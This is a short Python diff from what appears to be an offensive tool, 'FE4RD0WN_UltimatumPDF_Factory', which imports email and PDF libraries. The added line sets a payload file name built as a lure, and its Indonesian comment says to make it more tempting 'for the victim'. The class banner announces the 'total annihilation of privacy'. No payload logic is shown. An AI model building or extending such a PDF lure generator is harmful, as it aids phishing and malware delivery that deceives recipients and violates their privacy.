@@ -8,7 +8,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 import datetime
 from fpdf.enums import XPos, YPos # Import untuk DeprecationWarning yang kau keluhkan
-
+PAYLOAD_FILENAME = "LAPORAN_FINAL_RAHASIA_TERLARANG.pdf" # Ubah nama ini agar lebih menggiurkan bagi korban!
 class FE4RD0WN_UltimatumPDF_Factory:
     def __init__(self):
         print("😈 FE4RD0WN-ULTIMATUM_PDF_FACTORY v1.0 Initiated. Prepare for total annihilation of privacy! 😈")
